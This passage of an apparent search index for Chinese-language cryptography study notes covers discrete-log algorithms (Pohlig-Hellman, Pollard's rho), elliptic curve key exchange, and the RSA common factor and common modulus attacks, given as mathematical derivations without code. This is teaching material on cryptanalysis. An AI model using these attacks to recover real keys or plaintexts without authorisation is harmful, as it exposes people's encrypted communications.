\uff0c\u4e00\u500b\u5143\u7d20 \\beta \\in \\mathbb{Z}_p^{*} \\beta \\in \\mathbb{Z}_p^{*} ( \\mathbb{Z}_p^{*} \\mathbb{Z}_p^{*} has order n n ) \u6c42 x x \u6eff\u8db3 \\alpha^{x} \\equiv \\beta \\pmod{p} \\alpha^{x} \\equiv \\beta \\pmod{p}","title":"Discrete Logarithm Problem"},{"location":"security/crypto/asymmetric/diffie-hellman/pohlig-hellman/","text":"Pohlig Hellman Algorithm \u7528\u4f86\u89e3 Discrete Logarithm Problem p-1 = p_1^{e_1} \\cdot p_2^{e_2} \\cdots p_r^{e_r} p-1 = p_1^{e_1} \\cdot p_2^{e_2} \\cdots p_r^{e_r} \u5148\u6c42 x_i = x \\mod p_i^{e_i} x_i = x \\mod p_i^{e_i} \uff0c\u518d\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u7d44\u56de x x \u600e\u9ebc\u6c42 x_i x_i ? \u8a2d q = p_i, e = e_i q = p_i, e = e_i \u5c07 x_i x_i \u8868\u793a\u6210 q q \u9032\u4f4d x_i = a_0 + a_1 q + \\cdots + a_{e - 1} q^{e - 1} x_i = a_0 + a_1 q + \\cdots + a_{e - 1} q^{e - 1} \u8a2d \\beta_j = \\beta\\alpha^{-(a_0 + a_1q + \\cdots + a_{j-1}q^{j-1})} \\beta_j = \\beta\\alpha^{-(a_0 + a_1q + \\cdots + a_{j-1}q^{j-1})} \\begin{align} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} &\\equiv (\\alpha^{x-(a_0 + a_1 q + \\cdots + a_{j-1} q^{j-1})})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\\\ &\\equiv (\\alpha^{a_j q^j + \\cdots + a_{e - 1} q^{e - 1} + s q^{e}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } s \\\\ &\\equiv (\\alpha^{a_j q^j + K_j q^{j+1}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } K_j \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}}\\alpha^{K(p-1)} \\pmod{p} \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} \\end{align} \\begin{align} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} &\\equiv (\\alpha^{x-(a_0 + a_1 q + \\cdots + a_{j-1} q^{j-1})})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\\\ &\\equiv (\\alpha^{a_j q^j + \\cdots + a_{e - 1} q^{e - 1} + s q^{e}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } s \\\\ &\\equiv (\\alpha^{a_j q^j + K_j q^{j+1}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } K_j \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}}\\alpha^{K(p-1)} \\pmod{p} \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} \\end{align} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} \\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} \\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} \uff0c\u9664\u4e86 a_j a_j \u4e4b\u5916\u6211\u5011\u90fd\u77e5\u9053 ( a_{0} a_{0} ~ a_{j-1} a_{j-1} \u6703\u6bd4 a_j a_j \u5148\u7b97\u51fa\u4f86 ) \u5047\u8a2d A = \\alpha^{\\frac{p-1}{q}}, B = (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} A = \\alpha^{\\frac{p-1}{q}}, B = (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} \u90a3\u9ebc B = A^{a_j} \\pmod{p} B = A^{a_j} \\pmod{p} \uff0c\u5df2\u77e5 A, B A, B \uff0c\u4e14 0 \\le a_j \\le q 0 \\le a_j \\le q \uff0c\u7576 q q \u5f88\u5c0f\u6211\u5011\u53ef\u4ee5\u8f15\u9b06\u89e3\u51fa a_j a_j \u89e3\u51fa\u6240\u6709\u7684 a_j a_j \u5c31\u89e3\u51fa x_i x_i \u89e3\u51fa\u6240\u6709\u7684 x_i x_i \u5c31\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u89e3\u51fa x x \u4f7f\u7528\u689d\u4ef6 p-1 p-1 \u662f smooth number ( \u5f88 smooth \u7684\u90a3\u7a2e ) \u76f8\u95dc\u8cc7\u6e90 cryptologie blog The Pohlig-Hellman Algorithm","title":"Pohlig Hellman Algorithm"},{"location":"security/crypto/asymmetric/diffie-hellman/pohlig-hellman/#pohlig-hellman-algorithm","text":"\u7528\u4f86\u89e3 Discrete Logarithm Problem p-1 = p_1^{e_1} \\cdot p_2^{e_2} \\cdots p_r^{e_r} p-1 = p_1^{e_1} \\cdot p_2^{e_2} \\cdots p_r^{e_r} \u5148\u6c42 x_i = x \\mod p_i^{e_i} x_i = x \\mod p_i^{e_i} \uff0c\u518d\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u7d44\u56de x x \u600e\u9ebc\u6c42 x_i x_i ? \u8a2d q = p_i, e = e_i q = p_i, e = e_i \u5c07 x_i x_i \u8868\u793a\u6210 q q \u9032\u4f4d x_i = a_0 + a_1 q + \\cdots + a_{e - 1} q^{e - 1} x_i = a_0 + a_1 q + \\cdots + a_{e - 1} q^{e - 1} \u8a2d \\beta_j = \\beta\\alpha^{-(a_0 + a_1q + \\cdots + a_{j-1}q^{j-1})} \\beta_j = \\beta\\alpha^{-(a_0 + a_1q + \\cdots + a_{j-1}q^{j-1})} \\begin{align} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} &\\equiv (\\alpha^{x-(a_0 + a_1 q + \\cdots + a_{j-1} q^{j-1})})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\\\ &\\equiv (\\alpha^{a_j q^j + \\cdots + a_{e - 1} q^{e - 1} + s q^{e}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } s \\\\ &\\equiv (\\alpha^{a_j q^j + K_j q^{j+1}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } K_j \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}}\\alpha^{K(p-1)} \\pmod{p} \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} \\end{align} \\begin{align} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} &\\equiv (\\alpha^{x-(a_0 + a_1 q + \\cdots + a_{j-1} q^{j-1})})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\\\ &\\equiv (\\alpha^{a_j q^j + \\cdots + a_{e - 1} q^{e - 1} + s q^{e}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } s \\\\ &\\equiv (\\alpha^{a_j q^j + K_j q^{j+1}})^{\\frac{p - 1}{q^{j+1}}} \\pmod{p} \\text{ for some } K_j \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}}\\alpha^{K(p-1)} \\pmod{p} \\\\ &\\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} \\end{align} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} \\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} \\equiv \\alpha^{\\frac{a_j(p-1)}{q}} \\pmod{p} \uff0c\u9664\u4e86 a_j a_j \u4e4b\u5916\u6211\u5011\u90fd\u77e5\u9053 ( a_{0} a_{0} ~ a_{j-1} a_{j-1} \u6703\u6bd4 a_j a_j \u5148\u7b97\u51fa\u4f86 ) \u5047\u8a2d A = \\alpha^{\\frac{p-1}{q}}, B = (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} A = \\alpha^{\\frac{p-1}{q}}, B = (\\beta_j)^{\\frac{p - 1}{q^{j+1}}} \u90a3\u9ebc B = A^{a_j} \\pmod{p} B = A^{a_j} \\pmod{p} \uff0c\u5df2\u77e5 A, B A, B \uff0c\u4e14 0 \\le a_j \\le q 0 \\le a_j \\le q \uff0c\u7576 q q \u5f88\u5c0f\u6211\u5011\u53ef\u4ee5\u8f15\u9b06\u89e3\u51fa a_j a_j \u89e3\u51fa\u6240\u6709\u7684 a_j a_j \u5c31\u89e3\u51fa x_i x_i \u89e3\u51fa\u6240\u6709\u7684 x_i x_i \u5c31\u7528\u4e2d\u570b\u5269\u9918\u5b9a\u7406\u89e3\u51fa x x","title":"Pohlig Hellman Algorithm"},{"location":"security/crypto/asymmetric/diffie-hellman/pohlig-hellman/#_1","text":"p-1 p-1 \u662f smooth number ( \u5f88 smooth \u7684\u90a3\u7a2e )","title":"\u4f7f\u7528\u689d\u4ef6"},{"location":"security/crypto/asymmetric/diffie-hellman/pohlig-hellman/#_2","text":"cryptologie blog The Pohlig-Hellman Algorithm","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/diffie-hellman/pollard-rho/","text":"Pollard's Rho Algorithm \u76ee\u6a19 : \u627e x x \u6eff\u8db3 \\alpha^x = \\beta \\pmod{p} \\alpha^x = \\beta \\pmod{p} \\mathbb{Z}_p \\mathbb{Z}_p \u7684 order \u662f n = p - 1 n = p - 1 \u7528 Floyd's Cycle Finding Algorithm \u5c0b\u627e a, b, A, B a, b, A, B \u6eff\u8db3 \\alpha^a\\beta^b \\equiv \\alpha^A\\beta^B \\pmod{p} \\alpha^a\\beta^b \\equiv \\alpha^A\\beta^B \\pmod{p} \\alpha^{bx + a} \\equiv \\alpha^{Bx + A} \\pmod{p} \\alpha^{bx + a} \\equiv \\alpha^{Bx + A} \\pmod{p} bx + a \\equiv Bx + A \\pmod{n} bx + a \\equiv Bx + A \\pmod{n} x = (B - b)^{-1}(a - A) \\mod{n} x = (B - b)^{-1}(a - A) \\mod{n} \u8a3b\u8a18 stack exchange \u5f88\u6709\u53ef\u80fd gcd(B - b, n) = h \\ne 1 gcd(B - b, n) = h \\ne 1 n = hq n = hq \u6211\u5011\u6c92\u8fa6\u6cd5\u6c42 module inverse \u6539\u6c42 x' x' \u6eff\u8db3 (a^h)^{x'} \\equiv b^h \\pmod{p} (a^h)^{x'} \\equiv b^h \\pmod{p} \u9019\u6a23 a^h a^h \u9019\u500b generator \u6703\u7522\u751f\u4e00\u500b order q q \u7684 subgroup \u6c42\u51fa x' x' \u4e4b\u5f8c hx' \\equiv hx \\pmod{n = hq} hx' \\equiv hx \\pmod{n = hq} x' \\equiv x \\pmod{q} x' \\equiv x \\pmod{q} \u8907\u96dc\u5ea6 \u6642\u9593\u8907\u96dc\u5ea6 : O(\\sqrt{n}) O(\\sqrt{n}) \u7a7a\u9593\u8907\u96dc\u5ea6 : O(1) O(1)","title":"Pollard's Rho Algorithm"},{"location":"security/crypto/asymmetric/diffie-hellman/pollard-rho/#pollards-rho-algorithm","text":"\u76ee\u6a19 : \u627e x x \u6eff\u8db3 \\alpha^x = \\beta \\pmod{p} \\alpha^x = \\beta \\pmod{p} \\mathbb{Z}_p \\mathbb{Z}_p \u7684 order \u662f n = p - 1 n = p - 1 \u7528 Floyd's Cycle Finding Algorithm \u5c0b\u627e a, b, A, B a, b, A, B \u6eff\u8db3 \\alpha^a\\beta^b \\equiv \\alpha^A\\beta^B \\pmod{p} \\alpha^a\\beta^b \\equiv \\alpha^A\\beta^B \\pmod{p} \\alpha^{bx + a} \\equiv \\alpha^{Bx + A} \\pmod{p} \\alpha^{bx + a} \\equiv \\alpha^{Bx + A} \\pmod{p} bx + a \\equiv Bx + A \\pmod{n} bx + a \\equiv Bx + A \\pmod{n} x = (B - b)^{-1}(a - A) \\mod{n} x = (B - b)^{-1}(a - A) \\mod{n}","title":"Pollard's Rho Algorithm"},{"location":"security/crypto/asymmetric/diffie-hellman/pollard-rho/#_1","text":"stack exchange \u5f88\u6709\u53ef\u80fd gcd(B - b, n) = h \\ne 1 gcd(B - b, n) = h \\ne 1 n = hq n = hq \u6211\u5011\u6c92\u8fa6\u6cd5\u6c42 module inverse \u6539\u6c42 x' x' \u6eff\u8db3 (a^h)^{x'} \\equiv b^h \\pmod{p} (a^h)^{x'} \\equiv b^h \\pmod{p} \u9019\u6a23 a^h a^h \u9019\u500b generator \u6703\u7522\u751f\u4e00\u500b order q q \u7684 subgroup \u6c42\u51fa x' x' \u4e4b\u5f8c hx' \\equiv hx \\pmod{n = hq} hx' \\equiv hx \\pmod{n = hq} x' \\equiv x \\pmod{q} x' \\equiv x \\pmod{q}","title":"\u8a3b\u8a18"},{"location":"security/crypto/asymmetric/diffie-hellman/pollard-rho/#_2","text":"\u6642\u9593\u8907\u96dc\u5ea6 : O(\\sqrt{n}) O(\\sqrt{n}) \u7a7a\u9593\u8907\u96dc\u5ea6 : O(1) O(1)","title":"\u8907\u96dc\u5ea6"},{"location":"security/crypto/asymmetric/elliptic-curve/introduction/","text":"Introduction to Elliptic Curve Elliptic Curve \u7684\u5b9a\u7fa9\u5c31\u662f\u6eff\u8db3\u4e0b\u9762\u7684\u5f0f\u5b50\u7684\u9ede\u7684\u96c6\u5408 E = \\{(x,y) \\ | \\ y^2 = x^3 + ax + b\\} \\text{ where } 4a^3 + 27b^2 \\neq 0 E = \\{(x,y) \\ | \\ y^2 = x^3 + ax + b\\} \\text{ where } 4a^3 + 27b^2 \\neq 0 x,y,a,b \\in \\mathbb{R} \\text{ or } \\mathbb{Q} \\text{ or } \\mathbb{C} \\text{ or } \\mathbb{Z}_p x,y,a,b \\in \\mathbb{R} \\text{ or } \\mathbb{Q} \\text{ or } \\mathbb{C} \\text{ or } \\mathbb{Z}_p \u5728 cryptography \u901a\u5e38\u662f\u7528 \\mathbb{Z}_p \\mathbb{Z}_p \u518d\u914d\u4e0a\u4e00\u500b \u55ae\u4f4d\u5143\u7d20 O O \uff0c\u4ee3\u8868\u7121\u9650\u9060\u7684\u9ede \u53cd\u5143\u7d20 -P -P \uff0c\u4ee3\u8868 P P \u5c0d x \u8ef8\u7684\u93e1\u5c04 \u904b\u7b97\u5143 + + ( \u4ee5\u4e0b\u7a31\u52a0\u6cd5 ) \u5c31\u5f62\u6210\u4e00\u500b\u7fa4 P + Q = R \u5f9e\u5e7e\u4f55\u7684\u89d2\u5ea6 : R \u5c31\u662f P \u548c Q \u756b\u4e00\u689d\u7dda\u627e\u53e6\u4e00\u500b\u5728\u6a62\u5713\u66f2\u7dda\u4e0a\u7684\u4ea4\u9ede\u5c0d x \u8ef8\u7684\u93e1\u5c04 \u5f9e\u4ee3\u6578\u7684\u89d2\u5ea6 : P \\ne Q P \\ne Q : s = \\frac{y_p - y_q}{x_p - x_q} s = \\frac{y_p - y_q}{x_p - x_q} x_r = s^2 - (x_p + x_q) x_r = s^2 - (x_p + x_q) y_r = s(x_p - x_r) - y_p y_r = s(x_p - x_r) - y_p P = Q P = Q : s = \\frac{3x_p^2 + a}{2y_p} s = \\frac{3x_p^2 + a}{2y_p} x_r = s^2 -2x_p x_r = s^2 -2x_p y_r = s(x_p - x_r) - y_p y_r = s(x_p - x_r) - y_p \u53ef\u4ee5\u770b\u9019\u500b\u5f71\u7247 : P + Q in algebra kP \u53ef\u4ee5\u770b\u6210 k \u6b21\u52a0\u6cd5","title":"Introduction to Elliptic Curve"},{"location":"security/crypto/asymmetric/elliptic-curve/introduction/#introduction-to-elliptic-curve","text":"Elliptic Curve \u7684\u5b9a\u7fa9\u5c31\u662f\u6eff\u8db3\u4e0b\u9762\u7684\u5f0f\u5b50\u7684\u9ede\u7684\u96c6\u5408 E = \\{(x,y) \\ | \\ y^2 = x^3 + ax + b\\} \\text{ where } 4a^3 + 27b^2 \\neq 0 E = \\{(x,y) \\ | \\ y^2 = x^3 + ax + b\\} \\text{ where } 4a^3 + 27b^2 \\neq 0 x,y,a,b \\in \\mathbb{R} \\text{ or } \\mathbb{Q} \\text{ or } \\mathbb{C} \\text{ or } \\mathbb{Z}_p x,y,a,b \\in \\mathbb{R} \\text{ or } \\mathbb{Q} \\text{ or } \\mathbb{C} \\text{ or } \\mathbb{Z}_p \u5728 cryptography \u901a\u5e38\u662f\u7528 \\mathbb{Z}_p \\mathbb{Z}_p \u518d\u914d\u4e0a\u4e00\u500b \u55ae\u4f4d\u5143\u7d20 O O \uff0c\u4ee3\u8868\u7121\u9650\u9060\u7684\u9ede \u53cd\u5143\u7d20 -P -P \uff0c\u4ee3\u8868 P P \u5c0d x \u8ef8\u7684\u93e1\u5c04 \u904b\u7b97\u5143 + + ( \u4ee5\u4e0b\u7a31\u52a0\u6cd5 ) \u5c31\u5f62\u6210\u4e00\u500b\u7fa4","title":"Introduction to Elliptic Curve"},{"location":"security/crypto/asymmetric/elliptic-curve/introduction/#p-q-r","text":"\u5f9e\u5e7e\u4f55\u7684\u89d2\u5ea6 : R \u5c31\u662f P \u548c Q \u756b\u4e00\u689d\u7dda\u627e\u53e6\u4e00\u500b\u5728\u6a62\u5713\u66f2\u7dda\u4e0a\u7684\u4ea4\u9ede\u5c0d x \u8ef8\u7684\u93e1\u5c04 \u5f9e\u4ee3\u6578\u7684\u89d2\u5ea6 : P \\ne Q P \\ne Q : s = \\frac{y_p - y_q}{x_p - x_q} s = \\frac{y_p - y_q}{x_p - x_q} x_r = s^2 - (x_p + x_q) x_r = s^2 - (x_p + x_q) y_r = s(x_p - x_r) - y_p y_r = s(x_p - x_r) - y_p P = Q P = Q : s = \\frac{3x_p^2 + a}{2y_p} s = \\frac{3x_p^2 + a}{2y_p} x_r = s^2 -2x_p x_r = s^2 -2x_p y_r = s(x_p - x_r) - y_p y_r = s(x_p - x_r) - y_p \u53ef\u4ee5\u770b\u9019\u500b\u5f71\u7247 : P + Q in algebra","title":"P + Q = R"},{"location":"security/crypto/asymmetric/elliptic-curve/introduction/#kp","text":"\u53ef\u4ee5\u770b\u6210 k \u6b21\u52a0\u6cd5","title":"kP"},{"location":"security/crypto/asymmetric/elliptic-curve/key-exchange/","text":"Elliptic Curve Key Exchange Elliptic Curve Key Exchange \u53ef\u4ee5\u5728\u96d9\u65b9\u6c92\u6709\u4efb\u4f55\u5171\u901a\u8cc7\u8a0a\u7684\u60c5\u6cc1\u4e0b\uff0c\u5728\u4e0d\u5b89\u5168\u7684\u901a\u9053\u4e2d\u5171\u4eab\u7955\u5bc6 \u5047\u8a2d\u6211\u5011\u6709\u4e00\u500b Elliptic Curve \u548c\u4e00\u500b generator G G Alice \u548c Bob \u60f3\u8981\u5171\u4eab\u7955\u5bc6 Alice \u96a8\u6a5f\u7522\u751f a a \uff0cBob \u96a8\u6a5f\u7522\u751f b b Alice \u8a08\u7b97 aG = A aG = A \uff0c\u50b3\u9001\u7d66 Bob Bob \u8a08\u7b97 bG = B bG = B \uff0c\u50b3\u9001\u7d66 Alice Alice \u8a08\u7b97 a(bG) = abG a(bG) = abG Bob \u8a08\u7b97 b(aG) = abG b(aG) = abG Alice \u548c Bob \u5171\u4eab\u7955\u5bc6 abG abG Elliptic Curve Discrete Logarithm Problem \u7d66\u5728 Elliptic Curve \u4e0a\u7684\u5169\u9ede P, Q P, Q \u6c42 k k such that Q = kP Q = kP \u9019\u500b\u554f\u984c\u662f\u975e\u5e38\u96e3\u89e3\u7684\u554f\u984c","title":"Elliptic Curve Key Exchange"},{"location":"security/crypto/asymmetric/elliptic-curve/key-exchange/#elliptic-curve-key-exchange","text":"Elliptic Curve Key Exchange \u53ef\u4ee5\u5728\u96d9\u65b9\u6c92\u6709\u4efb\u4f55\u5171\u901a\u8cc7\u8a0a\u7684\u60c5\u6cc1\u4e0b\uff0c\u5728\u4e0d\u5b89\u5168\u7684\u901a\u9053\u4e2d\u5171\u4eab\u7955\u5bc6 \u5047\u8a2d\u6211\u5011\u6709\u4e00\u500b Elliptic Curve \u548c\u4e00\u500b generator G G Alice \u548c Bob \u60f3\u8981\u5171\u4eab\u7955\u5bc6 Alice \u96a8\u6a5f\u7522\u751f a a \uff0cBob \u96a8\u6a5f\u7522\u751f b b Alice \u8a08\u7b97 aG = A aG = A \uff0c\u50b3\u9001\u7d66 Bob Bob \u8a08\u7b97 bG = B bG = B \uff0c\u50b3\u9001\u7d66 Alice Alice \u8a08\u7b97 a(bG) = abG a(bG) = abG Bob \u8a08\u7b97 b(aG) = abG b(aG) = abG Alice \u548c Bob \u5171\u4eab\u7955\u5bc6 abG abG","title":"Elliptic Curve Key Exchange"},{"location":"security/crypto/asymmetric/elliptic-curve/key-exchange/#elliptic-curve-discrete-logarithm-problem","text":"\u7d66\u5728 Elliptic Curve \u4e0a\u7684\u5169\u9ede P, Q P, Q \u6c42 k k such that Q = kP Q = kP \u9019\u500b\u554f\u984c\u662f\u975e\u5e38\u96e3\u89e3\u7684\u554f\u984c","title":"Elliptic Curve Discrete Logarithm Problem"},{"location":"security/crypto/asymmetric/rsa/backdoor/","text":"Backdoor in RSA Hidden Small Private Exponent TODO Hidden Small Prime Public Exponent TODO Hidden Small Public Exponent TODO \u76f8\u95dc\u8cc7\u6e90 Simple Backdoors for RSA Key Generation A Comprehensive Study of Backdoors for RSA Key Generation A Space Efficient Backdoor in RSA and Its Applications page 128","title":"Backdoor in RSA"},{"location":"security/crypto/asymmetric/rsa/backdoor/#backdoor-in-rsa","text":"","title":"Backdoor in RSA"},{"location":"security/crypto/asymmetric/rsa/backdoor/#hidden-small-private-exponent","text":"TODO","title":"Hidden Small Private Exponent"},{"location":"security/crypto/asymmetric/rsa/backdoor/#hidden-small-prime-public-exponent","text":"TODO","title":"Hidden Small Prime Public Exponent"},{"location":"security/crypto/asymmetric/rsa/backdoor/#hidden-small-public-exponent","text":"TODO","title":"Hidden Small Public Exponent"},{"location":"security/crypto/asymmetric/rsa/backdoor/#_1","text":"Simple Backdoors for RSA Key Generation A Comprehensive Study of Backdoors for RSA Key Generation A Space Efficient Backdoor in RSA and Its Applications page 128","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/rsa/common-factor-attack/","text":"Common Factor Attack \u7576\u5169\u500b\u516c\u9470 (n_1, e_1), (n_2, e_2) (n_1, e_1), (n_2, e_2) \u7684 n_1, n_2 n_1, n_2 \u6709 \u5171\u540c\u7684\u8cea\u56e0\u6578 \u6642 \u6211\u5011\u76f4\u63a5\u7528 gcd(n_1, n_2) gcd(n_1, n_2) \u5728 O(log(min(n_1, n_2)) O(log(min(n_1, n_2)) \u7684\u6642\u9593\u5167\u5206\u89e3 n_1, n_2 n_1, n_2 Batch GCD \u7576\u6211\u5011\u6709\u4e00\u7fa4\u516c\u9470\uff0c\u7b49\u65bc\u662f\u6211\u5011\u6709\u4e00\u5806 n n \uff0c\u6211\u5011\u60f3\u77e5\u9053\u662f\u5426\u6709\u5176\u4e2d\u4e00\u5c0d n n \u6709 \u5171\u540c\u7684\u8cea\u56e0\u6578 \u4ee5 z_1 z_1 \u70ba\u4f8b\uff0c\u4ee5\u4e0b\u63a8\u5c0e gcd(N_1, \\frac{z_1}{N_1}) gcd(N_1, \\frac{z_1}{N_1}) \u5be6\u969b\u4e0a\u5c31\u662f gcd(N_1, N_2 \\cdots N_m) gcd(N_1, N_2 \\cdots N_m) \u6211\u5011\u53ef\u4ee5\u628a z_1 z_1 \u5beb\u6210 z_1 = N_1 N_2 \\cdots N_m \\text{ mod } N_1^2 = N_1 N_2 \\cdots N_m - k N_1^2 \\text{ for some } k z_1 = N_1 N_2 \\cdots N_m \\text{ mod } N_1^2 = N_1 N_2 \\cdots N_m - k N_1^2 \\text{ for some } k \uff0c\u90a3\u9ebc \\begin{align} &\\frac{z_1}{N_1} = \\frac{N_1 N_2 \\cdots N_m - k N_1^2}{N_1} = N_2 \\cdots N_m - k N_1 \\\\ &gcd(N_1, \\frac{z_1}{N_1}) = gcd(N_1, N_2 \\cdots N_m - k N_1) = gcd(N_1, N_2 \\cdots N_m) \\end{align} \\begin{align} &\\frac{z_1}{N_1} = \\frac{N_1 N_2 \\cdots N_m - k N_1^2}{N_1} = N_2 \\cdots N_m - k N_1 \\\\ &gcd(N_1, \\frac{z_1}{N_1}) = gcd(N_1, N_2 \\cdots N_m - k N_1) = gcd(N_1, N_2 \\cdots N_m) \\end{align} \u7b2c\u4e00\u6b65\u9a5f\u6c42\u4e58\u6cd5\u6642\u7528 product tree \u52a0\u901f \u7b2c\u4e8c\u6b65\u9a5f\u6c42\u9918\u6578\u6642\u7528 remainder tree \u52a0\u901f \u76f8\u95dc\u8cc7\u6e90 how to efficiently compute a batch gcd Mining Your Ps and Qs: Detection of Widespread Weak Keys in Network Devices FAST MULTIPLICATION AND ITS APPLICATIONS CTF \u984c\u76ee SECCON 2017 Online CTF - Ps and Qs","title":"Common Factor Attack"},{"location":"security/crypto/asymmetric/rsa/common-factor-attack/#common-factor-attack","text":"\u7576\u5169\u500b\u516c\u9470 (n_1, e_1), (n_2, e_2) (n_1, e_1), (n_2, e_2) \u7684 n_1, n_2 n_1, n_2 \u6709 \u5171\u540c\u7684\u8cea\u56e0\u6578 \u6642 \u6211\u5011\u76f4\u63a5\u7528 gcd(n_1, n_2) gcd(n_1, n_2) \u5728 O(log(min(n_1, n_2)) O(log(min(n_1, n_2)) \u7684\u6642\u9593\u5167\u5206\u89e3 n_1, n_2 n_1, n_2","title":"Common Factor Attack"},{"location":"security/crypto/asymmetric/rsa/common-factor-attack/#batch-gcd","text":"\u7576\u6211\u5011\u6709\u4e00\u7fa4\u516c\u9470\uff0c\u7b49\u65bc\u662f\u6211\u5011\u6709\u4e00\u5806 n n \uff0c\u6211\u5011\u60f3\u77e5\u9053\u662f\u5426\u6709\u5176\u4e2d\u4e00\u5c0d n n \u6709 \u5171\u540c\u7684\u8cea\u56e0\u6578 \u4ee5 z_1 z_1 \u70ba\u4f8b\uff0c\u4ee5\u4e0b\u63a8\u5c0e gcd(N_1, \\frac{z_1}{N_1}) gcd(N_1, \\frac{z_1}{N_1}) \u5be6\u969b\u4e0a\u5c31\u662f gcd(N_1, N_2 \\cdots N_m) gcd(N_1, N_2 \\cdots N_m) \u6211\u5011\u53ef\u4ee5\u628a z_1 z_1 \u5beb\u6210 z_1 = N_1 N_2 \\cdots N_m \\text{ mod } N_1^2 = N_1 N_2 \\cdots N_m - k N_1^2 \\text{ for some } k z_1 = N_1 N_2 \\cdots N_m \\text{ mod } N_1^2 = N_1 N_2 \\cdots N_m - k N_1^2 \\text{ for some } k \uff0c\u90a3\u9ebc \\begin{align} &\\frac{z_1}{N_1} = \\frac{N_1 N_2 \\cdots N_m - k N_1^2}{N_1} = N_2 \\cdots N_m - k N_1 \\\\ &gcd(N_1, \\frac{z_1}{N_1}) = gcd(N_1, N_2 \\cdots N_m - k N_1) = gcd(N_1, N_2 \\cdots N_m) \\end{align} \\begin{align} &\\frac{z_1}{N_1} = \\frac{N_1 N_2 \\cdots N_m - k N_1^2}{N_1} = N_2 \\cdots N_m - k N_1 \\\\ &gcd(N_1, \\frac{z_1}{N_1}) = gcd(N_1, N_2 \\cdots N_m - k N_1) = gcd(N_1, N_2 \\cdots N_m) \\end{align} \u7b2c\u4e00\u6b65\u9a5f\u6c42\u4e58\u6cd5\u6642\u7528 product tree \u52a0\u901f \u7b2c\u4e8c\u6b65\u9a5f\u6c42\u9918\u6578\u6642\u7528 remainder tree \u52a0\u901f","title":"Batch GCD"},{"location":"security/crypto/asymmetric/rsa/common-factor-attack/#_1","text":"how to efficiently compute a batch gcd Mining Your Ps and Qs: Detection of Widespread Weak Keys in Network Devices FAST MULTIPLICATION AND ITS APPLICATIONS","title":"\u76f8\u95dc\u8cc7\u6e90"},{"location":"security/crypto/asymmetric/rsa/common-factor-attack/#ctf","text":"SECCON 2017 Online CTF - Ps and Qs","title":"CTF \u984c\u76ee"},{"location":"security/crypto/asymmetric/rsa/common-modulus-attack/","text":"Common Modulus Attack \u6709\u5169\u500b\u516c\u9470 (n, e_1), (n, e_2) (n, e_1), (n, e_2) \u6709\u76f8\u540c\u7684 n n (modulus)\uff0c\u4e14 gcd(e_1, e_2) = 1 gcd(e_1, e_2) = 1 \u6211\u5011\u6514\u622a\u5230\u5206\u5225\u7528\u9019\u5169\u628a\u516c\u9470\u52a0\u5bc6 m m \u70ba c_1, c_2 c_1, c_2 \u90a3\u9ebc\u6211\u5011\u5c31\u53ef\u4ee5\u5728\u4e0d\u5206\u89e3 n n \u7684\u60c5\u6cc1\u4e0b\uff0c\u9084\u539f m m \u539f\u7406 e_1s_1 + e_2s_2 = gcd(e_1, e_2) = 1 e_1s_1 + e_2s_2 = gcd(e_1, e_2) = 1 \u6839\u64da\u8c9d\u7956\u5b9a\u7406 s_1, s_2 s_1, s_2 \u6709\u6574\u6578\u89e3 \u53ef\u4ee5\u7528\u64f4\u5c55\u6b50\u5e7e\u91cc\u5f97\u6c42\u51fa s_1, s_2 s_1, s_2 c_1^{s_1}c_2^{s_2} \\equiv m^{e_1s_1}m^{e_2s_2} = m^{e_1s_1 + e_2s_2} = m \\pmod{n} c_1^{s_1}c_2^{s_2} \\equiv m^{e_1s_1}m^{e_2s_2} = m^{e_1s_1 + e_2s_2} = m \\pmod{n}","title":"Common Modulus Attack"},{"location":"security/crypto/asymmetric/rsa/common-modulus-attack/#common-modulus-attack","text":"\u6709\u5169\u500b\u516c\u9470 (n, e_1), (n, e_2) (n, e_1), (n, e_2) \u6709\u76f8\u540c\u7684 n n (modulus)\uff0c\u4e14 gcd(e_1, e_2) = 1 gcd(e_1, e_2) = 1 \u6211\u5011\u6514\u622a\u5230\u5206\u5225\u7528\u9019\u5169\u628a\u516c\u9470\u52a0\u5bc6 m m \u70ba c_1, c_2 c_1, c_2 